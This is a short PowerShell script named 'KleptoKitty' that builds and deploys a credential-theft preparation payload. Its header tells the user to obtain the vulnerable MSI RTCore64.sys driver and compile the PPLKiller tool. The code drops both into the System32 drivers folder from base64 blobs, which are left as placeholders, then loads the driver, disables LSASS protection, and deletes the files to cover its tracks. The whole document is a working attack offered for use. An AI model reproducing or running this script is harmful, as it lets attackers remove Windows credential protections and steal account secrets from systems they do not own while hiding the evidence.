<#

     =^._.^=
    _(      )/  KleptoKitty

    How to build payload:

    1.  Get RTCore64.sys from a MSI driver
        http://download-eu2.guru3d.com/afterburner/%5BGuru3D.com%5D-MSIAfterburnerSetup462Beta2.zip
    
    2.  Get PPLKiller and compile it
        https://github.com/RedCursorSecurityConsulting/PPLKiller

#>

# Driver - Base64 encoded
$BlobDriver = "<add base64 string here>"
$PathDriver = "$env:SystemRoot\System32\drivers\RTCore64.sys"

# PPLKiller - Base64 encoded
$BlobExec = "<add base64 string here>"
$PathExec = "$env:SystemRoot\System32\drivers\RTCore64.exe"

# Deploy Driver, Run PPLKiller (remove LSASS protection)
cd "$env:SystemRoot\System32\drivers"
[IO.File]::WriteAllBytes($PathDriver, [Convert]::FromBase64String($BlobDriver))
[IO.File]::WriteAllBytes($PathExec, [Convert]::FromBase64String($BlobExec))
&$PathExec /installDriver
&$PathExec /disableLSAProtection
&$PathExec /uninstallDriver

# Clean house
Remove-Item -Force $PathDriver
Remove-Item -Force $PathExec
